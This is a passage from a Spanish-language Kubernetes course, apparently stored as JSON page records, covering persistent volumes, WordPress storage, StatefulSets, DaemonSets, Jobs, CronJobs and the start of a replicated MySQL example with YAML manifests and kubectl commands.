a acceder a la aplicación para comprobar que el servidor web sigue sirviendo el mismo fichero index.html:\nkubectl delete -f deploy-ejemplo1.yaml\nkubectl apply -f deploy-ejemplo1.yaml\n\nY volvemos acceder al mismo puerto:\nImagen de elaboración propia (CC BY-NC-SA)\n\nEliminación del volumen\nSi finalmente queremos eliminar los volúmenes creados, tendremos que eliminar la solicitud, el objeto PersistentVolumeClaim, y dependiendo de la política de reciclaje con la que creamos el objeto PersistentVolume tendremos distintos comportamientos.\nEn este caso, como la política de reciclaje con la que creamos el volumen es Recycle, no se eliminará pero se borrará su contenido y el volumen se podrá reutilizar, es decir su estado volverá a Available:\nkubectl delete persistentvolumeclaim/pvc-ejemplo1\n\nkubectl get pv,pvc\nNAME                           CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS      CLAIM   STORAGECLASS   REASON   AGE\npersistentvolume/pv-ejemplo1   5Gi        RWX            Recycle          Available           manual                  8m8s\n\nSi queremos eliminar el objeto PersistentVolume, ejecutamos:\nkubectl delete persistentvolume/pv-ejemplo1\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/ejemplo-2-gestion-dinamica-de-volumenes":{"title":"ejemplo-2-gestion-dinamica-de-volumenes","links":[],"tags":[],"content":"Ejemplo 2: Gestión dinámica de volúmenes\nOcultar\nEn este ejemplo vamos a desplegar un servidor web que va a servir una página html que tendrá almacenada en un volumen. En esta ocasión, la asignación del volumen se va a realizar de forma dinámica.\nAprovisonamiento del volumen\nPara que la asignación del volumen (objeto PersitentVolume) se haga de forma dinámica al crear la solicitud (objeto PersitentVolumeClaim) es necesario tener configurado un aprovisonador de almacenamiento que se define en un objeto StorageClass. Como vimos en minikube tenemos configurado un aprovisonador para volúmenes de tipo hostPath:\nkubectl get storageclass\nNAME                 PROVISIONER                RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE\nstandard (default)   k8s.io/minikube-hostpath   Delete          Immediate           false                  46d\n\nDe tal manera que cuando creemos una solicitud de volumen (objeto PersitentVolumeClaim) se creara de forma dinámica un objeto PersitentVolume, que se asociaría a la solicitud.\nSolicitud del volumen\nVamos a realizar la solicitud de volumen, en este caso usaremos el fichero pvc-ejemplo2.yaml:\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n    name: pvc-ejemplo2\nspec:\n  accessModes:\n    - ReadWriteOnce\n  resources:\n    requests:\n      storage: 1Gi\n\nNota\nOcultar\nNota: Fíjate que esta definición hemos quitado la declaración storageClassName: manual. Al no ponerla se elegirá el storageclass por defecto, cuya definición hemos visto anteriormente en minikube y que en este caso se llama standard.\nOcultar\nCuando creemos el objeto PersistentVolumeClaim, veremos que de forma dinámica se creará un PersitentVolumen que se asociará a nuestra solicitud::\nkubectl apply -f pvc-ejemplo2.yaml\n\nkubectl get pv,pvc\nNAME                                                        CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                  STORAGECLASS   REASON   AGE\npersistentvolume/pvc-6a09c69a-4344-447c-b23d-d85c7edd7f36   1Gi        RWX            Delete           Bound    default/pvc-ejemplo2   standard                1s\n\nNAME                                 STATUS   VOLUME                                     CAPACITY   ACCESS MODES   STORAGECLASS   AGE\npersistentvolumeclaim/pvc-ejemplo2   Bound    pvc-6a09c69a-4344-447c-b23d-d85c7edd7f36   1Gi        RWX            standard       1s\n\n\nNota\nOcultar\nNota: En este caso, como el volumen se ha generado dinámicamente, su capacidad es igual a la solicitada, 1 Gb.\nOcultar\nComo el volumen ha sido generado de forma dinámica por el aprovisonador, éste habrá escogido una carpeta del host que corresponda al volumen.\nkubectl describe persistentvolume/pvc-6a09c69a-4344-447c-b23d-d85c7edd7f36\n...\nSource:\n    Type:          HostPath (bare host directory volume)\n    Path:          /tmp/hostpath-provisioner/default/pvc-ejemplo2\n...\n\nUso del volumen\nA partir de este punto el ejercicio es muy parecido al que vimos en el ejemplo1.\nCreamos el Deployment usando el fichero deploy-ejemplo2.yaml:\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ejemplo2\n  labels:\n    app: nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      volumes:\n        - name: volumen-ejemplo2\n          persistentVolumeClaim:\n            claimName: pvc-ejemplo2\n      containers:\n        - name: contenedor-nginx\n          image: nginx\n          ports:\n            - name: http-server\n              containerPort: 80\n          volumeMounts:\n            - mountPath: &quot;/usr/share/nginx/html&quot;\n              name: volumen-ejemplo2\n\nCreamos el Deployment:\nkubectl apply -f deploy-ejemplo2.yaml\n\nY a continuación, cuando el contenedor esté funcionando, creamos el fichero index.html:\nkubectl get all\n...\nNAME                                 READY   STATUS    RESTARTS   AGE\npod/nginx-ejemplo2-7b79b5966-zbdqh   1/1     Running   0          5s\n...\nkubectl exec pod/nginx-ejemplo2-7b79b5966-zbdqh -- bash -c &quot;echo &#039;&lt;h1&gt;Almacenamiento en K8S&lt;/h1&gt;&#039; &gt; /usr/share/nginx/html/index.html&quot;\n\nFinalmente creamos el Service de acceso al despliegue, usando el fichero srv-ejemplo2.yaml.\nkubectl apply -f srv-ejemplo2.yaml\n\nkubectl get all\n...\nservice/nginx-ejemplo2   NodePort    10.99.48.24   &lt;none&gt;        80:31053/TCP   3s\n...\n\nY accedemos a la aplicación accediendo a la ip del nodo controlador del cluster y al puerto asignado al Service NodePort:\nminikube ip\n192.168.39.222\n\nImagen de elaboración propia (CC BY-NC-SA)\nFinalmente puedes volver a comprobar que la información de la aplicación no se pierde borrando el Deployment y volviéndolo a crear, comprobando que se sigue sirviendo el fichero index.html.\nEliminación del volumen\nEn este caso, los volúmenes que crea de forma dinámica el storageclass que tenemos creado en minikube, tienen como política de reciclaje el valor de Delete. Esto significa que cuando eliminemos la solicitud, el objeto PersistentVolumeClaim, también se borrará el volumen, el objeto PersistentVolume.\nkubectl delete persistentvolumeclaim/pvc-ejemplo2\n\nkubectl get pv,pvc\nNo resources found\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/ejemplo-3-wordpress-con-almacenamiento-persistente":{"title":"ejemplo-3-wordpress-con-almacenamiento-persistente","links":[],"tags":[],"content":"Ejemplo 3: Wordpress con almacenamiento persistente\nOcultar\nEn este ejemplo vamos a volver e realizar el Ejemplo completo: Despliegue y acceso a Wordpress + MariaDB del módulo anterior, pero añadiendo el almacenamiento necesario para que la aplicación sea persistente.\nPara llevar a cabo esta tarea necesitaremos tener a nuestra disposición dos volúmenes:\n\nUno para guardar la información de Wordpress.\nOtro para guardar la información de MariaDB.\n\nPara este ejercicio utilizaremos asignación dinámica de volúmenes.\nCreación de los volúmenes necesarios\nComo hemos comentado vamos a usar la asignación dinámica de volúmenes, por lo tanto tendremos que crear dos objetos PersistentVolumenClaim para solicitar los dos volúmenes.\nPara solicitar el volumen para la aplicación Wordpress usaremos el fichero wordpress-pvc.yaml:\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n    name: wordpress-pvc\nspec:\n  accessModes:\n    - ReadWriteOnce\n  resources:\n    requests:\n      storage: 5Gi\n\nY para solicitar el volumen para la base de datos usaremos un fichero similar: mariadb-pvc.yaml:\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n    name: mariadb-pvc\nspec:\n  accessModes:\n    - ReadWriteOnce\n  resources:\n    requests:\n      storage: 5Gi\n\nCreamos las solicitudes y comprobamos que se ha asociado un volumen a cada una de ellas:\nkubectl apply -f wordpress-pvc.yaml\nkubectl apply -f mariadb-pvc.yaml\n\nkubectl get pv,pvc\nNAME                                                        CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                   STORAGECLASS   REASON   AGE\npersistentvolume/pvc-01ed3c4c-a542-4161-93a9-b9d5ea2bf6d1   5Gi        RWX            Delete           Bound    default/wordpress-pvc   standard                10s\npersistentvolume/pvc-78acc14b-71da-4cf0-861d-0ab7780bca4f   5Gi        RWX            Delete           Bound    default/mariadb-pvc     standard                10s\n\nNAME                                  STATUS   VOLUME                                     CAPACITY   ACCESS MODES   STORAGECLASS   AGE\npersistentvolumeclaim/mariadb-pvc     Bound    pvc-78acc14b-71da-4cf0-861d-0ab7780bca4f   5Gi        RWX            standard       10s\npersistentvolumeclaim/wordpress-pvc   Bound    pvc-01ed3c4c-a542-4161-93a9-b9d5ea2bf6d1   5Gi        RWX            standard       10s\n\n\nModificación de los Deployments para el uso de los volúmenes\nA continuación vamos a modificar el fichero wordpress-deployment.yaml para añadir el volumen al Pod y el punto de montaje:\n...\n    spec:\n      containers:\n      ...\n          volumeMounts:\n            - name: wordpress-vol\n              mountPath: /var/www/html\n      volumes:\n        - name: wordpress-vol\n          persistentVolumeClaim:\n            claimName: wordpress-pvc\n\nComo observamos vamos a usar el volumen asociado al PersistentVolumenClaim wordpress-pvc y que lo vamos a montar en el directorio DocumentRoot del servidor web: /var/www/html.\nDe forma similar, modificamos el fichero mariadb-deployment.yaml:\n...\n    spec:\n      containers:\n    ...\n          volumeMounts:\n            - name: mariadb-vol\n              mountPath: /var/lib/mysql\n      volumes:\n        - name: mariadb-vol\n          persistentVolumeClaim:\n            claimName: mariadb-pvc\n\nEn esta ocasión usaremos el volumen asociado a mariadb-pvc y el punto de montaje se hará sobre el directorio donde se guarda la información de la base de datos: /var/lib/mysql.\nEvidentemente, no es necesario modificar la definición de los otros recursos: Services e Ingress.\nCreamos el Deployment, los Services y el Ingress:\n\nmariadb-srv.yaml\nwordpress-srv.yaml\nwordpress-ingress.yaml\n\nkubectl apply -f mariadb-deployment.yaml\nkubectl apply -f mariadb-srv.yaml\nkubectl apply -f wordpress-deployment.yaml\nkubectl apply -f wordpress-srv.yaml\nkubectl apply -f wordpress-ingress.yaml\n\nAcedemos a la aplicación y la configuramos:\n \nImagen de elaboración propia (CC BY-NC-SA)\nImagen de elaboración propia (CC BY-NC-SA)\nComprobando la persistencia de la información\nSi en cualquier momento tenemos que eliminar o actualizar uno de los despliegues, podemos comprobar que la información sigue existiendo después de volver a crear los Deployments:\nkubectl delete -f mariadb-deployment.yaml\nkubectl delete -f wordpress-deployment.yaml\nkubectl apply -f mariadb-deployment.yaml\nkubectl apply -f wordpress-deployment.yaml\n\nSi volvemos acceder, comprobamos que la aplicación sigue funcionando con toda la información:\nImagen de elaboración propia (CC BY-NC-SA)"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/9.0-otras-cargas-de-trabajo":{"title":"9.0-otras-cargas-de-trabajo","links":[],"tags":[],"content":"9. Otras cargas de trabajo\n¿Podemos usar un despliegue para todo?\nHasta ahora hemos visto con bastante detalle el uso de los despliegues (Deployments) en Kubernetes. Los despliegues son una herramienta enormemente potente ya que nos permiten adecuar el número de pods a la demanda y garantizan el funcionamiento continuo, tanto en el caso de que haya algún nodo con problemas, como en el caso de actualizaciones que se pueden realizar de forma continua. Sin embargo, no es posible utilizar despliegues en todos los casos, hay determinadas situaciones en las que hay cargas de trabajo (workloads) que no se ajustan adecuadamente a un despliegue de Kubernetes, por lo que se han desarrollado otros objetos para esas situaciones diferentes.\nSí es conveniente remarcar, que siempre que sea posible es mejor definir una carga de trabajo como un despliegue en Kubernetes y limitar el uso de las otras cargas de trabajo que vamos a ver a continuación para casos específicos. Luego la respuesta a la pregunta con la que empezamos este módulo es no, no podemos usar un despliegue para todo, pero sí debemos usarlo prioritariamente siempre que sea posible.\nAplicaciones con estado o sin estado\nUna característica de una aplicación que es muy importante para Kubernetes es si se trata de una aplicación con estado (stateful) o sin estado (stateless). Una aplicación sin estado es aquella en la que las peticiones son totalmente independientes unas de otras y no necesita ninguna referencia de una petición anterior. Un ejemplo de una aplicación sin estado sería un servicio DNS, en el que cada vez que se realiza una petición es totalmente independiente de las anteriores o posteriores que se hagan. Las aplicaciones sin estado son perfectas para desplegarse el Kubernetes, ya que se ajustan perfectamente a un Deployment y se pueden escalar y balancear sin problemas, ya que cada pod responderá a las peticiones que reciba de forma independiente al resto.\nPor contra, las aplicaciones con estado son aquellas en las que una petición puede verse afectada por el resultado de las anteriores y a su vez puede afectar a las posteriores (por eso se dice que tiene estado). Una base de datos sería el paradigma de una aplicación con estado, puesto que cada modificación que hagamos a la base de datos puede afectar a las consultas posteriores. Una aplicación con estado no se ajusta bien a un Deployment de Kubernetes, ya que de forma general, un cluster de pods independientes no puede tener en cuenta el estado de la aplicación correctamente.\nEsto enlaza con el modelo de desarrollo de las aplicaciones, ya que si pensamos en la mayoría de las aplicaciones que utilizamos hoy en día, se trata de aplicaciones con estado, lo que inicialmente podría limitar su uso en Kubernetes. Sin embargo, si descomponemos estas aplicaciones en muchos y pequeños servicios que se intercomuniquen entre sí, bastantes de ellos se podrán gestionar como aplicaciones sin estado, mientras que otros tendrán que ser aplicaciones con estado. Éste es uno de los enfoques más utilizados hoy en día para desplegar aplicaciones en Kubernetes, hacer que la aplicación se ajuste al modelo de microservicios, para utilizar Deployments en todos los microservicios sin estado que se pueda y utilizar otras cargas de trabajo para el resto de componentes. En esta unidad veremos una pequeña introducción a estas otras cargas de trabajo."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/9.1-statefulsets":{"title":"9.1-statefulsets","links":[],"tags":[],"content":"9.1 StatefulSets\nEl objeto StatefulSet controla el despliegue de Pods con identidades únicas y persistentes, y nombres de host estables. El uso de StatefulSets es alternativo al de despliegues (Deployments) y su objetivo principal es poder utilizar en Kubernetes aplicaciones más restrictivas que no se ajusten bien a las características de los despliegues, principalmente aplicaciones con estado que necesiten algunas características fijas y estables en los Pods, algo que no puede ocurrir con los despliegues en los pods que son completamente indistinguibles unos de otros y la aplicación puede utilizar cualquiera de ellos en cada momento.\nVeamos algunos ejemplos en los es adecuado utilizar StatefulSet en lugar de Deployment y por qué:\n\nUn despliegue de redis primario-secundario: necesita que el primario esté operativo antes de que podamos configurar las réplicas.\nUn cluster mongodb: Los diferentes nodos deben tener una identidad de red persistente (ya que el DNS es estático), para que se produzca la sincronización después de reinicios o fallos.\nZookeeper: cada nodo necesita almacenamiento único y estable, ya que el identificador de cada nodo se guarda en un fichero.\n\nPor lo tanto el objeto StatefulSet nos ofrece las siguientes características:\n\nEstable y único identificador de red (Ejemplo mongodb)\nAlmacenamiento estable (Ejemplo Zookeeper)\nDespliegues y escalado ordenado (Ejemplo redis)\nEliminación y actualizaciones ordenadas\n\nPor lo tanto cada Pod es distinto (tiene una identidad única), y este hecho tiene algunas consecuencias:\n\nEl nombre de cada Pod tendrá un número (1,2,…) que lo identifica y que nos proporciona la posibilidad de que la creación actualización y eliminación sea ordenada. Se crearán en orden ascendente y se eliminarán en orden descendente.\nSi un nuevo Pod es recreado, obtendrá el mismo nombre (hostname), los mismos nombres DNS (aunque la IP pueda cambiar) y el mismo volumen que tenía asociado.\nNecesitamos crear un Service especial, llamado Headless Service, que nos permite acceder a los Pods de forma independiente, pero que no balancea la carga entre ellos, por lo tanto este Service no tendrá una ClusterIP.\n\nStatefulSet vs Deployment\n\nA diferencia de un Deployment, un StatefulSet mantiene una identidad fija para cada uno de sus Pods.\nEliminar y/o escalar un StatefulSet no eliminará los volúmenes asociados con StatefulSet.\nStatefulSets actualmente requiere que un Headless Service sea responsable de la identidad de red de los Pods.\nAl utilizar StatefulSet, cada Pod recibe un PersistentVolume independiente.\nStatefulSet actualmente no admite el escalado automático.\n\nCreando el Headless Service para acceder a los Pods del StatefulSet\nUna de las características de los Pods controlados por un StatefulSet es que son únicos (todos los Pods son distintos), por lo tanto al acceder a ellos por medio de la definición de un Service no necesitamos el balanceo de carga entre ellos.\nPara acceder a los Pods de un StatefulSet vamos a crear un Service Headless que se caracteriza por no tener IP (ClusterIP) y por lo tanto no va a balancear la carga entre los distintos Pods. Este tipo de Service va a crear una entrada DNS por cada Pod, que nos permitirá acceder a cada Pod de forma independiente. El nombre DNS que se creará será &lt;nombre del Pod&gt;.&lt;dominio del StatefulSet&gt;. El dominio del StatefulSet se indicará en la definición del recurso usando el parámetro serviceName.\nVeamos un ejemplo de definición de un Headless Service (fichero service.yaml):\napiVersion: v1\nkind: Service\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\nspec:\n  ports:\n  - port: 80\n    name: web\n  clusterIP: None\n  selector:\n    app: nginx\n\nEn esta definición podemos observar que al indicar clusterIP: None estamos creando un Headless Service, que no tendrá ClusterIP (por lo que no balanceará la carga entre los pods). Este Service será el responsable de crear, por cada Pod seleccionado con el selector, una entrada DNS.\nCreando el recurso StatefulSet\nVamos a definir nuestro recurso StatefulSet en un fichero yaml statefulset.yaml:\napiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: web\nspec:\n  serviceName: &quot;nginx&quot;\n  replicas: 2\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: k8s.gcr.io/nginx-slim:0.8\n        ports:\n        - containerPort: 80\n          name: web\n        volumeMounts:\n        - name: www\n          mountPath: /usr/share/nginx/html\n  volumeClaimTemplates:\n  - metadata:\n      name: www\n    spec:\n      accessModes: [ &quot;ReadWriteOnce&quot; ]\n      resources:\n        requests:\n          storage: 1Gi\n\nVamos a estudiar las características de la definición de este recurso:\n\nCon el parámetro serviceName indicaremos el nombre de dominio que va a formar parte del nombre DNS que el Headless Service va a crear para cada Pod.\nCon el parámetro selector se indica los Pods que vamos a controlar con StatefulSet.\nUna de las características que hemos indicado del StatefulSet es que cada Pod va a tener un almacenamiento estable. El tipo de almacenamiento se indica con el parámetro volumeClaimTemplates que se define de forma similar a un PersistentVolumenClaim.\nAdemás observamos en la definición del contenedor que el almacenamiento que hemos definido se va a montar en cada Pod (en este ejemplo el punto de montaje es el DocumentRoot de nginx), con el parámetro volumeMounts.\n\nEjemplo: Creación de un StatefulSet\nVamos a crear los recursos estudiados en este apartado: el Service Headless y el StatefulSet, y vamos a comprobar sus características.\nLo primero es crear el Headless Service:\nkubectl apply -f service.yaml\n\nCreación ordenada de Pods\nEl statefulSet que hemos definido va a crear dos Pods (replicas: 2). Para observar cómo se crean de forma ordenada podemos usar dos terminales, en la primera ejecutamos:\nwatch kubectl get pod\n\nCon esta instrucción vamos a ver en “vivo” cómo se van creando los Pods, que vamos a crear al ejecutar en otra terminal la instrucción:\nkubectl apply -f statefulset.yaml\n\nComprobamos la identidad de red estable\nEn este caso vamos a comprobar que los hostname y los nombres DNS son estables para cada Pod. Las ips de los Pods pueden cambiar si eliminamos el recurso StatefulSet y lo volvemos a crear, pero los nombres van a permanecer.\nPara ver los nombres de los Pods podemos ejecutar lo siguiente:\nfor i in 0 1; do kubectl exec web-$i -- sh -c &#039;hostname&#039;; done\nweb-0\nweb-1\n\nVeamos los nombres DNS. En este ejemplo el Headless Service ha creado una entrada en el DNS para cada Pod. El nombre DNS que se creará será &lt;nombre del pod&gt;.&lt;dominio del StatefulSet&gt;. El dominio del StatefulSet se indicará en la definición del recurso usando el parámetro serviceName. En este caso el nombre del primer Pod será web-0.nginx. Vamos a comprobarlo, haciendo una consulta DNS desde otro pod:\nkubectl run -i --tty --image busybox:1.28 dns-test --restart=Never --rm\n/ # nslookup web-0.nginx\n...\nAddress 1: 172.17.0.4 web-0.nginx.default.svc.cluster.local\n/ # nslookup web-1.nginx\n...\nAddress 1: 172.17.0.5 web-1.nginx.default.svc.cluster.local\n\nEliminación de pods\nPodemos usar las dos terminales para observar cómo la eliminación también se hace de forma ordenada. En la primera terminal ejecutamos:\nwatch kubectl get pod\n\nY en la segunda:\nkubectl delete pod -l app=nginx\n\nAl eliminar los Pods, el statefulSet ha creado nuevos Pods que serán idénticos a los anteriores y por lo tanto mantendrán la identidad de red, es decir tendrán los mismos hostname y los mismos nombres DNS (aunque es posible que cambien las ip):\nfor i in 0 1; do kubectl exec web-$i -- sh -c &#039;hostname&#039;; done\nweb-0\nweb-1\n\nkubectl run -i --tty --image busybox:1.28 dns-test --restart=Never --rm\n/ # nslookup web-0.nginx\n...\n/ # nslookup web-1.nginx\n...\n\nEscribiendo en los volúmenes persistente\nPodemos comprobar que se han creado los distintos volúmenes para cada pod:\nkubectl get pv,pvc\n\nY podemos comprobar que realmente la información que guardemos en el directorio que hemos montado en cada Pod es persistente:\nfor i in 0 1; do kubectl exec &quot;web-$i&quot; -- sh -c &#039;echo &quot;$(hostname)&quot; &gt; /usr/share/nginx/html/index.html&#039;; done\nfor i in 0 1; do kubectl exec -i -t &quot;web-$i&quot; -- sh -c &#039;curl http://localhost/&#039;; done\nweb-0\nweb-1\n\nAhora si eliminamos los Pods, los nuevos Pods creados mantendrán la información:\nkubectl delete pod -l app=nginx\nfor i in 0 1; do kubectl exec -i -t &quot;web-$i&quot; -- sh -c &#039;curl http://localhost/&#039;; done\nweb-0\nweb-1\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/9.2-daemonsets":{"title":"9.2-daemonsets","links":[],"tags":[],"content":"9.2 DaemonSets\nEl objeto DaemonSet (DS) se utiliza cuando queremos ejecutar un pod en todos los nodos del cluster o al menos en un conjunto de ellos que tienen una serie de características en común. Un DaemonSet se utiliza en algunas circunstancias muy concretas, por ejemplo:\n\nEjecutar un pod en cada nodo para la monitorización del cluster: Prometheus, Sysdig, collectd, datadog, etc.\nEjecutar un pod en cada nodo para la recolección y gestión de logs: fluentd, logstash\nEjecutar un pod en cada nodo para el almacenamiento del cluster: ceph o glusterfs\n\nUn ejemplo de DaemonSet tendría el siguiente aspecto:\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: daemonset1\nspec:\n  selector:\n      matchLabels:\n        name: daemonset-pod \n  template:               # Plantilla con las características del Pod\n    metadata:\n      labels:\n        name: daemonset-pod \n    spec:\n      nodeSelector:\n        type: worker-prod # Etiqueta del nodo en el que se ejecuta (opcional)\n      containers:\n      - name: daemon-pod\n        image: ...\n\nLos parámetros tienen los valores habituales anteriormente descritos y en este caso, se incluye una plantilla con la descripción del pod que se ejecutará en cada nodo (en este caso en cada nodo con etiqueta worker-prod)."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/9.3-jobs-y-cronjobs":{"title":"9.3-jobs-y-cronjobs","links":[],"tags":[],"content":"9.3 Jobs y Cronjobs\nJob\nEl objeto Job se utiliza cuando queremos ejecutar una tarea puntual, para lo que se define el objeto y se crean todos los objetos necesarios para realizarla, principalmente creando uno o varios Pods hasta que se finaliza la tarea. Una vez se termina la tarea y de forma general, los pods permanecerán creados y no se borrarán hasta que se elimine el Job que los creó.\nUn ejemplo de Job tendría el siguiente aspecto:\napiVersion: batch/v1\nkind: Job\nmetadata:\n  name: pi\nspec:\n  template:\n    spec:\n      containers:\n      - name: pi\n        image: perl\n        command: [&quot;perl&quot;,  &quot;-Mbignum=bpi&quot;, &quot;-wle&quot;, &quot;print bpi(2000)&quot;]\n      restartPolicy: Never\n  backoffLimit: 4\n\nEn el ejemplo anterior se lanza un contenedor de la imagen perl y realiza el cálculo de Pi con una precisión de 2000 decimales utilizando este lenguaje.\nUna vez lanzada la tarea, podremos ver que se crea tanto un objeto Job como un Pod, el primero aparece sin finalizar y el Pod aparece ejecutándose:\nNAME           READY   STATUS    RESTARTS   AGE\npod/pi-jbt4r   1/1     Running   0          4s\n\n...\n\nNAME           COMPLETIONS   DURATION   AGE\njob.batch/pi   0/1           4s         4s\n\nSin embargo, una vez que la tarea del contenedor finaliza, en este caso cuando se consigue el número Pi con dos mil decimales de precisión, el Pod se para y la tarea se marca como completada:\nNAME           READY   STATUS      RESTARTS   AGE\npod/pi-jbt4r   0/1     Completed   0          10s\n\n....\n\nNAME           COMPLETIONS   DURATION   AGE\njob.batch/pi   1/1           9s         10s\n\nPodemos ver que no se borra el Pod, ya que lo necesitamos en muchas ocasiones para ver el resultado de la tarea. En este caso para ver el número Pi con la precisión solicitada, veríamos los logs del pod:\nkubectl logs pi-jbt4r\n3.1415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679821480865132823066470938446095505822317253594081284811174502841027019385211055596446229489549303819644288109756659334461284756482337867831652712019091456485669234603486104543266482133936072602491412737245870066063155881748815209209628292540917153643678925903600113305305488204665213841469519415116094330572703657595919530921861173819326117931051185480744623799627495673518857527248912279381830119491298336733624406566430860213949463952247371907021798609437027705392171762931767523846748184676694051320005681271452635608277857713427577896091736371787214684409012249534301465495853710507922796892589235420199561121290219608640344181598136297747713099605187072113499999983729780499510597317328160963185950244594553469083026425223082533446850352619311881710100031378387528865875332083814206171776691473035982534904287554687311595628638823537875937519577818577805321712268066130019278766111959092164201989380952572010654858632788659361533818279682303019520353018529689957736225994138912497217752834791315155748572424541506959508295331168617278558890750983817546374649393192550604009277016711390098488240128583616035637076601047101819429555961989467678374494482553797747268471040475346462080466842590694912933136770289891521047521620569660240580381501935112533824300355876402474964732639141992726042699227967823547816360093417216412199245863150302861829745557067498385054945885869269956909272107975093029553211653449872027559602364806654991198818347977535663698074265425278625518184175746728909777727938000816470600161452491921732172147723501414419735685481613611573525521334757418494684385233239073941433345477624168625189835694855620992192221842725502542568876717904946016534668049886272327917860857843838279679766814541009538837863609506800642251252051173929848960841284886269456042419652850222106611863067442786220391949450471237137869609563643719172874677646575739624138908658326459958133904780275901\n\nPara seguir aprendiendo\nOcultar\n\nPara más información acerca de los Jobs puedes leer la documentación de la API.\n\nOcultar\nCronJob\nEn el caso de que la tarea que tengamos que realizar no sea puntual, sino que se tenga que repetir cada cierto tiempo conforme a un patrón, k8s ofrece el objeto CronJob, que creará tareas conforme a la periodicidad que se indique.\nEn el siguiente ejemplo de CronJob, ejecutamos una tarea cada minuto, en la que se muestra la fecha y hora junto al texto “Curso del CEP”:\napiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: hello\nspec:\n  schedule: &quot;*/1 * * * *&quot;\n  jobTemplate:\n    spec:\n      template:\n        spec:\n          containers:\n          - name: hello\n            image: busybox\n            imagePullPolicy: IfNotPresent\n            command:\n            - /bin/sh\n            - -c\n            - date; echo Curso del CEP\n          restartPolicy: OnFailure\n\nPara la definición del objeto CronJob debe especificarse un nombre y el patrón de repetición conforme al cron de UNIX, además de incluir en jobTemplate la definición del objeto Job que se desea ejecutar."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/ejemplo-despliegue-de-un-cluster-con-mysql":{"title":"ejemplo-despliegue-de-un-cluster-con-mysql","links":[],"tags":[],"content":"Ejemplo: despliegue de un cluster con MySQL\nOcultar\nUna base de datos relacional es un ejemplo perfecto de aplicación con estado, cualquier petición puede depender del estado resultante de una petición anterior, y todas las peticiones deben consultar o modificar la base de datos que incluya la última modificación realizada. Las implicaciones que tiene esto si queremos desplegar la base de datos sobre Kubernetes son importantes, ya que será necesario que la base de datos se pueda desplegar en un cluster para proporcionar disponibilidad, se pueda adaptar a variaciones de demanda y no haya interrupciones, mientras que hay que garantizar que todos los pods accedan a la base de datos de forma coherente.\n\n¿Podemos utilizar un Deployment con réplicas indistinguibles que se crean o destruyen a demanda?\n¿Necesitamos un volumen adicional para almacenar localmente la base de datos en cada pod?\n¿Cómo garantizamos la replicación de la base de datos entre los nodos?\n\nHay diferentes formas de afrontar esto y dependen mucho de las características de la base de datos en cuestión. En este ejemplo vamos a desplegar un cluster de MySQL con un nodo primario (también denominado master) en modo lectura y escritura (se podrán hacer consultas y modificaciones de la base de datos) y varios nodos secundarios en modo lectura (sólo se utilizarán para realizar consultas). Utilizaremos para ello un StatefulSet, en el que los diferentes pods son distinguibles entre sí, tienen siempre el mismo nombre DNS interno y el mismo volumen se conecta siempre al mismo pod. El primer nodo que se desplegará será el primario, con un volumen asociado para la base de datos, el resto de nodos se arrancarán después del primario y al iniciarse sincronizarán la base de datos con la del primario y la almacenarán también en un volumen diferente para cada Pod.\nEste ejemplo es probablemente el más avanzado de todo el curso y utilizaremos además otros recursos como ConfigMap, Services o volúmenes. Este ejemplo está extraído directamente de la documentación de k8s: Run a Replicated Stateful Application.\nNota\nOcultar\nNota Las características de este cluster no son para poner en producción, ya que se ha simplificado la configuración de MySQL, para centrarnos en los aspectos relacionados con Kubernetes.\nNota\nOcultar\nNota En caso de no tener recursos suficientes para realizar este ejemplo, se puede reducir el número de réplicas a dos, o bien eliminar el cluster y volverlo a crear con suficientes recursos (en el ejemplo siguiente creamos un nuevo cluster de k8s con 6 GiB de RAM y 4 cores virtuales:\nminikube stop\nminikube delete\nminikube start --driver ... --memory 6144 --cpus 4\n\nOcultar\nVamos pues con la creación de este cluster, para lo que utilizaremos diferentes objetos de Kubernetes que hemos visto durante todo el curso.\nCreamos un ConfigMap para modificar el fichero de configuración de MySQL, de manera que el primario genere los registros para la sincronización y los secundarios actúen en modo lectura: configmap.yaml\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: mysql\n  labels:\n    app: mysql\ndata:\n  primary.cnf: |\n    # Modificación del primario\n    [mysqld]\n    log-bin\n  replica.cnf: |\n    # Modificación de los secundarios\n    [mysqld]\n    super-read-only\n\nkubectl apply -f configmap.yaml\n\nCreamos dos servicios, uno de tipo Headless asociado con el StatefulSet para gestionar los nombres internos de los pods y otro para balancear entre los diferentes pods secundarios las peticiones de lectura: servicios.yaml\n# Servicio para usar los nombres DNS internamente\napiVersion: v1\nkind: Service\nmetadata:\n  name: mysql\n  labels:\n    app: mysql\nspec:\n  ports:\n  - name: mysql\n    port: 3306\n  clusterIP: None\n  selector:\n    app: mysql\n---\n# Servicio para balancear los clientes entre los nodos secundarios\n# en modo lectura\napiVersion: v1\nkind: Service\nmetadata:\n  name: mysql-read\n  labels:\n    app: mysql\nspec:\n  